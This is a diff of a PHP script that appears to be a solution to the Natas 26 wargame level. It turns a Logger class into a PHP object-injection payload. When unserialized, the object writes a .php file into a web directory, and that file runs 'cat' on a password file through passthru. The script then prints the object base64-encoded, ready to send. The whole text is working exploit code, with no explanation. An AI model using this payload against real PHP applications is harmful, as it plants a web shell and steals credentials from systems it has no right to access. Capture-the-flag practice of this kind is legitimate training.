@@ -1,4 +1,5 @@
 <?php
+error_reporting(0);
 	class Logger{
 		private $logFile;
 		private $initMsg;
@@ -7,8 +8,8 @@
 		function __construct($file){
 		    // initialise variables
 		    $this->initMsg="#--session started--#\n";
-		    $this->exitMsg="#--session end--#\n";
-		    $this->logFile = "/tmp/natas26_" . $file . ".log";
+		    $this->exitMsg="<?php passthru(\"cat /etc/natas_webpass/natas27\") ?>"; 
+		    $this->logFile = "img/natas26_tald.php";
 	      
 		    // write initial message
 		    $fd=fopen($this->logFile,"a+");
@@ -29,6 +30,6 @@
 		    fclose($fd);
 		}                       
 	    }
-
-	echo serialize(new Logger("tald"));
+	$obj = new Logger("tald");
+	echo base64_encode(serialize($obj));
 ?>
